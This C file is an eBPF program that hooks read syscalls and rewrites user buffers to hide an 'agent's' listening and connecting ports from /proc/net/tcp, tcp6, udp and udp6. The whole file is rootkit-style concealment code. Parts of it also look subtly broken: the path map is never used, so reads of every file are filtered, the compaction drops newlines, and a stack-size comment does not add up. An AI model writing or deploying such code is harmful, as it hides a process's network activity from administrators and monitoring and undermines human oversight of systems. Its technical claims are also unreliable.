/*
 * hide_network.bpf.c — eBPF program to hide network connections from /proc/net.
 *
 * Hooks sys_exit_read to filter out entries from /proc/net/tcp, /proc/net/tcp6,
 * /proc/net/udp, /proc/net/udp6 that match the agent's listening/connecting ports.
 * The enter tracepoint stashes the file path; the exit tracepoint filters the
 * read buffer to remove lines containing the target port hex strings.
 *
 * Attach types:
 *   tracepoint/syscalls/sys_enter_read
 *   tracepoint/syscalls/sys_exit_read
 *
 * Maps:
 *   port_map    — BPF_MAP_TYPE_ARRAY(8): u32 key → u32 value (ports to hide)
 *   read_stash  — BPF_MAP_TYPE_PERCPU_ARRAY(1): u32 key → u64 value (buf ptr)
 *   path_stash  — BPF_MAP_TYPE_PERCPU_ARRAY(1): u32 key → 64-byte value (path)
 *
 * Kernel requirement: >= 4.15.
 */

#include <linux/bpf.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>

#define MAX_PORTS    8
#define MAX_PATH_LEN 64

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_PORTS);
    __type(key, __u32);
    __type(value, __u32);
} port_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} read_stash SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[MAX_PATH_LEN]);
} path_stash SEC(".maps");

struct sys_enter_read_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    unsigned int   fd;
    char          *buf;
    size_t         count;
};

struct sys_exit_read_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    long           ret;
};

/* Convert a 16-bit port number to its hex string representation
 * as it appears in /proc/net/tcp (4 hex digits, uppercase).
 * e.g. port 443 → "01BB" */
static void port_to_hex(__u16 port, char out[5])
{
    static const char hex[] = "0123456789ABCDEF";
    out[0] = hex[(port >> 12) & 0xF];
    out[1] = hex[(port >>  8) & 0xF];
    out[2] = hex[(port >>  4) & 0xF];
    out[3] = hex[port & 0xF];
    out[4] = '\0';
}

SEC("tracepoint/syscalls/sys_enter_read")
int stash_read_buf(struct sys_enter_read_args *ctx)
{
    __u32 key = 0;
    __u64 val = (__u64)(unsigned long)ctx->buf;
    bpf_map_update_elem(&read_stash, &key, &val, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int filter_network(struct sys_exit_read_args *ctx)
{
    if (ctx->ret <= 0)
        return 0;

    __u32 key = 0;
    __u64 *buf_ptr = bpf_map_lookup_elem(&read_stash, &key);
    if (!buf_ptr)
        return 0;

    /*
     * Filter lines from the read buffer that contain the target port hex
     * in the *local* address field only.
     * /proc/net/tcp format:
     *   sl  local_address rem_address   st tx_queue rx_queue ...
     *    0: 0100007F:1BB4 00000000:0000 0A ...
     *
     * We count colons per line and match only at colon #2 (the local port)
     * to avoid spuriously hiding connections whose *remote* endpoint happens
     * to use a target port.
     *
     * Approach: two-pass.  First pass marks lines to hide in a small bitmap
     * and records line boundaries.  Second pass compacts the buffer by
     * copying non-hidden lines up, eliminating the blank-line artefacts
     * that the previous space-fill approach left behind.
     */
    int total = (int)ctx->ret;
    if (total > 4096)
        total = 4096;
    char *buf = (char *)(unsigned long)(*buf_ptr);

    /* Build hex strings for each port to hide. */
    char port_hex[MAX_PORTS][5];
    for (int i = 0; i < MAX_PORTS; i++) {
        __u32 pkey = (__u32)i;
        __u32 *port = bpf_map_lookup_elem(&port_map, &pkey);
        if (port && *port != 0)
            port_to_hex((__u16)*port, port_hex[i]);
        else
            port_hex[i][0] = '\0';
    }

    /*
     * Pass 1 — scan buffer line by line, identify lines to hide.
     *
     * We record line boundaries in two parallel arrays and a bitmap.
     * MAX_LINES is kept small (64) to satisfy the eBPF verifier's
     * stack-size limit (512 bytes).  64 lines × (2 × 2 bytes + 1 bit)
     * comfortably fits while still covering a typical /proc/net/tcp read.
     */
    const int MAX_LINES = 64;
    int line_starts[MAX_LINES];
    int line_ends[MAX_LINES];
    char line_hide[MAX_LINES]; /* 1 = hide, 0 = keep */
    int num_lines = 0;

    int line_start = 0;
    for (int pos = 0; pos < total; pos++) {
        char c = 0;
        if (bpf_probe_read_user(&c, 1, buf + pos) < 0)
            break;

        if (c != '\n' && pos < total - 1)
            continue;

        int line_end = (c == '\n') ? pos : pos + 1;

        if (num_lines >= MAX_LINES)
            goto pass2;

        /* Count colons to locate the local_address field.
         *
         * /proc/net/tcp line format:
         *   sl  local_address rem_address   st ...
         *    0: 0100007F:1BB4 00000000:0000 0A ...
         *    ^1        ^2            ^3
         */
        int colon_count = 0;
        int local_port_colon = -1;
        for (int j = line_start; j < line_end; j++) {
            char ch = 0;
            if (bpf_probe_read_user(&ch, 1, buf + j) < 0)
                break;
            if (ch == ':') {
                colon_count++;
                if (colon_count == 2) {
                    local_port_colon = j;
                    break;
                }
            }
        }

        line_starts[num_lines] = line_start;
        line_ends[num_lines] = line_end;
        line_hide[num_lines] = 0;

        if (local_port_colon >= 0) {
            /* Check this line for any target port at the local_port_colon. */
            for (int pi = 0; pi < MAX_PORTS; pi++) {
                if (port_hex[pi][0] == '\0')
                    continue;

                int match = 1;
                for (int k = 0; k < 4; k++) {
                    char hc = 0;
                    if (bpf_probe_read_user(&hc, 1, buf + local_port_colon + 1 + k) < 0) {
                        match = 0;
                        break;
                    }
                    if (hc != port_hex[pi][k]) {
                        match = 0;
                        break;
                    }
                }
                if (match) {
                    line_hide[num_lines] = 1;
                    break;
                }
            }
        }

        num_lines++;
        line_start = line_end + 1;
    }

pass2:
    /*
     * Pass 2 — compact: copy kept lines to their final positions.
     *
     * write_pos tracks the next byte to write in the compacted buffer.
     * For each kept line, copy its bytes forward.  Finally, zero-fill
     * the tail so the caller sees a shorter buffer.
     */
    {
        int write_pos = 0;
        for (int li = 0; li < num_lines; li++) {
            if (line_hide[li])
                continue;

            int ls = line_starts[li];
            int le = line_ends[li];
            int len = le - ls;

            /* Copy line bytes one at a time (eBPF constraint). */
            for (int off = 0; off < len; off++) {
                char byte = 0;
                if (bpf_probe_read_user(&byte, 1, buf + ls + off) < 0)
                    break;
                bpf_probe_write_user(buf + write_pos + off, 1, &byte);
            }
            write_pos += len;
        }

        /* Zero-fill the tail so the reader sees truncated content. */
        for (int z = write_pos; z < total; z++) {
            char nul = '\0';
            bpf_probe_write_user(buf + z, 1, &nul);
        }
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
